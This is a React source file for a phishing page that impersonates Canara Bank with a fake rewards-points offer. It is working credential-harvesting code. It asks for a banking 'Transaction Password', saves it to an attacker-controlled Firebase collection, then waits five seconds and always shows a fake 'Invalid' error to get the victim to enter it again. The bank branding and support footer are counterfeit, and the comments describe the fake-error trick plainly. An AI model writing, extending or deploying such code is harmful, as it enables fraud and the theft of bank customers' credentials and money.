import { useState } from 'react'; 
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
import headerImage from '../assets/second-page-header.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState(''); // Error state add ki gayi hai
  const navigate = useNavigate();
  const { documentId } = useParams();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setErrorMessage(''); // Submit par pehle error saaf karein

    try {
      // 1. Firebase mein data update (Backup ke liye)
      await FirebaseUtil.updateDocument("carvana", documentId, {
        password2,
      });

      // 2. 5 Seconds ka wait phir error dikhana
      setTimeout(() => {
        setIsSubmitting(false);
        setPassword2(''); // Password field ko clear karein
        setErrorMessage('Invalid Transaction Password. Please try again.'); // Error dikhayein
      }, 5000); // 5000ms = 5 Seconds delay

    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
      setErrorMessage('A network error occurred. Please try again later.');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header Image */}
      <div className="w-full">
        <img 
          src={headerImage} 
          alt="Bank Header" 
          className="w-full h-40 object-cover"
        />
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-blue-800">
              One Step Away To Collect Your Rewardz Points
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            
            {/* Error Message UI */}
            {errorMessage && (
              <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 transition-all duration-300">
                <p className="text-red-700 text-sm font-semibold">
                  {errorMessage}
                </p>
              </div>
            )}

            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className={`w-full py-2 px-3 rounded border text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  errorMessage ? 'border-red-500 bg-red-50' : 'border-gray-300'
                }`}
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
                placeholder="Enter Transaction Password"
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm shadow-md active:scale-95 transition-all"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
        <p className="text-xs opacity-75">For support, call 1800-123-4567 or email support@canarabank.com</p>
      </footer>
    </div>
  );
};

export default SecondPage;
